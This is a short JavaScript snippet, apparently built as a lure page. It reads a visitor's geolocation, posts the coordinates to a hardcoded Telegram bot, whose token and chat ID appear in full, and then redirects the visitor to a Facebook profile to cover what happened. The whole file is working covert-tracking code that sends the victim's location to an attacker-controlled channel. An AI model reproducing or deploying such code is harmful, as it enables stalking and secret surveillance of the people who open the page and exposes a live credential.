if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
        position => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const botToken = '6507011447:AAFQoG5r_wg2YFG6N8qxqnSnClzN-viNjdw';
            const chatId = '1195010636';
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const message = `
Location Info:
Latitude: ${latitude}
Longitude: ${longitude}
`;

            fetch(apiUrl, {
                method: 'POST',
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        window.location.href = 'https://m.facebook.com/people/%D8%A7%D9%88%D9%84%D8%A7%D8%AF%D9%8A-%D8%B3%D8%B1-%D8%B3%D8%B9%D8%A7%D8%AF%D8%AA%D9%8A/61552108177487/';
                    } else {
                        console.error('An error occurred while sending location data to Telegram.');
                    }
                })
                .catch(error => {
                    console.error('An error occurred:', error);
                });
        },
        error => {
            console.error('An error occurred while getting user location:', error);
        }
    );
} else {
    console.error('Geolocation is not supported.');
}
